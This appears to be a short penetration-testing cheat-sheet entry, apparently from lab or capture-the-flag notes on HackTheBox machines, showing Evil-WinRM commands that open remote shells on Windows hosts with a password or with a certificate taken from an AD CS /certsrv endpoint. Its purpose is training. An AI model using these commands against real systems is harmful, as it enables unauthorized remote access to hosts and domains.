Evil-WinRM to access via port tcp-5985 into a system:
```powershell
evil-winrm -i 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
```
Examples:
[[StreamIO#^963d06]]
[[StreamIO#^bef5fd]]
[[Forest#^b22389]]

### Active Directory Certificate Services
#Note We can extract the .cer and the .key from a .pfx as per the [[Legacy PFX certificate]] guide.
If we get a .cer certificate from the /certsrv endpoint on the DC website we can access to it as follows, for more info go to [[WinRM Certificate (password-less) based authentication]]:
```bash
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```
Examples:
[[Sizzle#^6fd8c7]]
